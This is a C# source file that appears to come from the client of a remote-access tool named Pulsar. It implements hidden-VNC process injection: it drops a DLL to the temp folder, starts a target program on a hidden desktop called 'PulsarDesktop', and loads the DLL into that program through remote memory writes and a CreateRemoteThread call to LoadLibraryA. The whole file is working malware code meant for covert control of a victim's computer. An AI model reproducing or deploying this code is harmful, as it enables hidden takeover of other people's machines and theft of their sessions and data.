using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Pulsar.Client.Helper.HVNC
{
    public class KDOTInjection
    {
        #region WinAPI Imports
        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);

        const uint CREATE_SUSPENDED = 0x00000004;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_READWRITE = 0x04;
        const uint PAGE_EXECUTE_READ = 0x20;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        #endregion

        #region Structures
        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        private struct STARTUPINFO
        {
            public int cb;

            public string lpReserved;

            public string lpDesktop;

            public string lpTitle;

            public int dwX;

            public int dwY;

            public int dwXSize;

            public int dwYSize;

            public int dwXCountChars;

            public int dwYCountChars;

            public int dwFillAttribute;

            public int dwFlags;

            public short wShowWindow;

            public short cbReserved2;

            public IntPtr lpReserved2;

            public IntPtr hStdInput;

            public IntPtr hStdOutput;

            public IntPtr hStdError;
        }
        #endregion

        public static string WriteDLLTempPath(byte[] dllbytes)
        {
            string tempPath = Path.Combine(Path.GetTempPath(), "pulsar.dll");
            File.WriteAllBytes(tempPath, dllbytes);
            return tempPath;
        }

        public static void HVNCInjection(string targetExePath, byte[] dllpath)
        {
            try
            {
                Debug.WriteLine($"[+] Target: {targetExePath}");

                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                si.lpDesktop = "PulsarDesktop";
                PROCESS_INFORMATION pi;

                string dllTempPath = WriteDLLTempPath(dllpath);


                bool success = CreateProcess(null, targetExePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref si, out pi);


                if (InjectDLL(pi.hProcess, dllTempPath))
                {
                    Debug.WriteLine("[+] DLL injected successfully");
                }
                else
                {
                    Debug.WriteLine("[-] DLL injection failed");
                }

                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[-] Error: {ex.Message}");
            }
        }

        static bool InjectDLL(IntPtr hProcess, string dllPath)
        {
            try
            {
                IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                if (loadLibraryAddr == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to get LoadLibraryA address");
                    return false;
                }

                byte[] dllBytes = Encoding.ASCII.GetBytes(dllPath);
                IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllBytes.Length + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (allocMemAddress == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to allocate memory in target process");
                    return false;
                }

                Console.WriteLine($"[+] Memory allocated at: 0x{allocMemAddress.ToString("X")}");

                IntPtr bytesWritten;
                if (!WriteProcessMemory(hProcess, allocMemAddress, dllBytes, (uint)dllBytes.Length, out bytesWritten))
                {
                    Console.WriteLine("[-] Failed to write DLL path to target process");
                    return false;
                }

                Console.WriteLine($"[+] DLL path written to target process ({bytesWritten} bytes)");

                IntPtr threadId;
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, out threadId);
                if (hThread == IntPtr.Zero)
                {
                    int error = Marshal.GetLastWin32Error();
                    Console.WriteLine($"[-] Failed to create remote thread. Error code: {error}");

                    switch (error)
                    {
                        case 5:
                            Console.WriteLine("    Error 5 (Access Denied): Try running as Administrator");
                            break;
                        case 8:
                            Console.WriteLine("    Error 8 (Not enough memory): Target process may be protected");
                            break;
                        case 998:
                            Console.WriteLine("    Error 998: Invalid access to memory location");
                            Console.WriteLine("    This often means architecture mismatch (x86/x64)");
                            break;
                    }

                    return false;
                }

                Console.WriteLine("[+] Remote thread created, waiting for LoadLibrary to complete...");

                WaitForSingleObject(hThread, 5000);

                uint exitCode = 0;
                if (GetExitCodeThread(hThread, out exitCode))
                {
                    if (exitCode == 0)
                    {
                        Console.WriteLine("[-] LoadLibrary returned NULL - DLL failed to load");
                        Console.WriteLine("    Check if the DLL path is correct and the DLL is valid");
                    }
                    else
                    {
                        Console.WriteLine($"[+] LoadLibrary succeeded, module handle: 0x{exitCode:X}");
                    }
                }

                CloseHandle(hThread);

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Injection error: {ex.Message}");
                return false;
            }
        }
    }
}
